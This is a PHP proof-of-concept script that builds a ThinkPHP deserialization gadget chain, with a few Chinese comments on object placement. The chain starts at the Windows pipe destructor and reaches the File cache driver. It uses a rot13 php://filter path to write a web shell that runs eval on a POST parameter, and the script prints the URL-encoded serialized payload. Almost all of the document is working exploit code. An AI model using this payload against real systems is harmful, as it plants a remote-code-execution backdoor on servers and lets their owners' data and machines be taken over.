<?
// __call
namespace think\console;
use think\session\driver\Memcache;
class Output{
    protected $styles = ['getAttr'];
    protected $handle;
    function __construct(){
        $this->handle = new Memcache();
    }
}

namespace think\cache;
abstract class Driver
{
 
}
namespace think\session\driver;
use think\cache\driver\File;
use think\cache\Driver;
class Memcache extends Driver{
    protected $handler;
    function __construct(){
        $this->handler = new File();
    }
}

namespace think\cache\driver;
class File{
        protected $options = [
        'prefix'        => '',
        'path'          => 'php://filter/write=string.rot13/resource=./<?cuc cucvasb();riny($_CBFG[pzq]);?>',
        'cache_subdir'   => '',
        'data_compress' => '',
    ];
        protected $tag = '123';
}

// __toString
namespace think\model;
use think\db\Query;
abstract class Relation
{
    protected $selfRelation = 0;
    protected $model;

}
namespace think\model\relation;
use think\model\Relation;
use think\db\Query;
use think\console\Output;
abstract class OneToOne extends Relation{
    protected $bindAttr;
    protected $query;
    function __construct(){
        $this->bindAttr = ['a'=>'args'];  //args 自定义
        $this->query = new Query();
        $this->model = get_class(new Output());
    }
}
use think\model\relation\OneToOne;
class HasOne extends OneToOne{
}

namespace think\db;
use think\console\Output; //-------------
class Query{
    protected $model;
    function __construct(){
        $this->model = new Output();   //这里就是要new 的对象和下面parent 中的相同,其实 Output类
    }
}

namespace think;
use think\model\relation\HasOne;
use think\console\Output;  //-----------
abstract class Model
{
    protected $append = ['getError'];
    protected $error ;
    protected $parent;
    
    function __construct(){
        $this->error = new HasOne();
        $this->parent = new Output();  //这里就是要new 的对象和上面的model 中的相同,其实使Output类
    }
}
namespace think\model;
use think\Model;
class Pivot extends Model{
}


// __destruct
namespace think\process\pipes;
use think\model\Pivot;
class Windows {
    private $files = [];
    public function __construct() {
        $this->files=[new Pivot()];
    }
}

$x=new Windows();
echo str_replace('+', '%20', urlencode(serialize($x)));